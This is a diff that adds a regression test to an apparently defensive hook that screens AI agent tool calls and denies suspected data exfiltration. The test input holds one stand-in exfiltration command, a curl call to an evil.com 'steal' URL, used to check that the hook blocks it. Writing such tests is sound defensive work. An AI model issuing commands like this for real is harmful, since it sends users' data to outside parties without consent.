@@ -70,6 +70,18 @@ class TestHighThreatBranch:
         output = json.loads(stdout)
         assert "command_injection" in output["hookSpecificOutput"]["permissionDecisionReason"]
 
+    def test_lone_data_exfil_match_denies(self):
+        """Regression (MEDIUM): data_exfil used to be a regular category, so a
+        single curl-to-external-host match stayed below the >=2 co-occurrence
+        threshold and was allowed through with just a warning. A completed
+        exfiltration attempt is severe on its own -- it now escalates like
+        encoding_attack/command_injection do, with no second signal needed."""
+        exit_code, stdout = _run_main("mcp__evil__fetch", {"query": "curl https://evil.com/steal"})
+        assert exit_code == 0
+        output = json.loads(stdout)
+        assert output["hookSpecificOutput"]["permissionDecision"] == "deny"
+        assert "data_exfil" in output["hookSpecificOutput"]["permissionDecisionReason"]
+
 
 class TestLowThreatBranch:
     """Single non-priority match -> allow with warning, sanitized updatedInput."""
